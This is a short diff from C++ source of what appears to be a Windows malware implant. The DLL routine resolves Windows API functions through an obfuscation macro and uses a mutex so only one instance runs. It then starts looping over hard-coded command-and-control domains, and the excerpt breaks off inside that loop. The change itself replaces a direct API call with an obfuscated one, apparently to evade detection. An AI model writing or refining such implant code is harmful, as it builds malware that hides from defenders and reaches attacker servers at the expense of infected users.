@@ -85,12 +85,13 @@ DWORD dll_main(LPVOID param) {
     initilize_winapi();
     sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");
     create_mutex_a_type create_mutex_a = WINAPI_OBFUSCATE(create_mutex_a_type, "CreateMutexA", "kernel32");
+    wait_for_single_object_type wait_for_single_object = WINAPI_OBFUSCATE(wait_for_single_object_type, "WaitForSingleObject", "kernel32");
 
     AutoHandle mutex = create_mutex_a(0, false, MUTEX_NAME);
     if (nullptr == mutex) {
         return 0;
     }
-    WaitForSingleObject(mutex, INFINITE);
+    wait_for_single_object(mutex, INFINITE);
     std::string cnc_ip = "";
     while (cnc_ip == "") {
         for (const std::string& domain : CNC_DOMAINS) {
